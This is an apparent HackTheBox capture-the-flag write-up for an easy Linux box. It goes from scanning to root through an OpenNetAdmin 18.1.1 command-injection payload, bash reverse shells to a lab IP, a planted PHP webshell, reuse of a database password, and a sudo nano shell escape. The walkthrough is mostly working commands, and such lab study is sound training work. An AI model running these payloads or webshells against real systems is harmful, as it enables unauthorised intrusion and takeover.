## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
**Tags:** `OpenNetAdmin`, `webshell`, `password reuse`, `sudo nano`, `GTFObins`

---

## 📡 Recon

### Nmap Scan

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.171
nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.171
```

- Open ports: `22 (SSH)`, `80 (HTTP)`
- Apache 2.4.29, [OpenSSH 7.6](SSH) → Ubuntu 18.04

---

## 🌐 [Web Enumeration](HTTP.md)

### Gobuster

```bash
gobuster dir -u http://10.10.10.171 \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
  -x php,txt,html -o scans/gobuster-root-php_txt_html
```

✅ Found:
- `/music`, `/artwork`, `/sierra`, `/ona`

### OpenNetAdmin (ONA)

- Version 18.1.1 (vulnerable)

---

## 🐚 Shell as www-data

### Exploit OpenNetAdmin RCE

```bash
curl -s -d "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" http://10.10.10.171/ona/
```

### Reverse Shell Payload

```bash
curl -s -d "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'&xajaxargs[]=ping" http://10.10.10.171/ona/
```

### Listener

```bash
nc -lvnp 443
```

✅ Shell as `www-data`

---

## 👤 Priv Esc: www-data → jimmy

### Database Password Reuse

```bash
cat /var/www/html/ona/local/config/database_settings.inc.php
# Found password: n1nj4W4rri0R!
```

### Switch User

```bash
su jimmy
```

✅ Shell as `jimmy`

---

## 👥 Priv Esc: jimmy → joanna

### View Internal Site Config

```bash
cat /etc/apache2/sites-enabled/internal.conf
# Port 52846, user joanna
```

### SSH Tunnel

```bash
ssh jimmy@10.10.10.171 -L 52846:localhost:52846
```

### Path 1: Webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /var/www/internal/shell.php
curl "http://127.0.0.1:52846/shell.php?cmd=id"
curl "http://127.0.0.1:52846/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'"
```

### Path 2: Decrypt Joanna’s SSH Key

```php
# From index.php: password = joanna
# Get key from main.php after login
```

Decrypt the key:

```bash
openssl rsa -in joanna-enc -out id_rsa_joanna
# Pass: bloodninjas
```

Login:

```bash
ssh -i id_rsa_joanna joanna@10.10.10.171
```

✅ Shell as `joanna`  
📄 `cat user.txt`

---

## 🔓 Priv Esc: joanna → root

### Sudo Rights

```bash
sudo -l
# /bin/nano /opt/priv (NOPASSWD)
```

### GTFObins - Nano Shell Escape

```bash
sudo /bin/nano /opt/priv
# Ctrl + R, then Ctrl + X
# Enter: reset; sh 1>&0 2>&0
# Then: bash
```

✅ Root shell  
📄 `cat /root/root.txt`
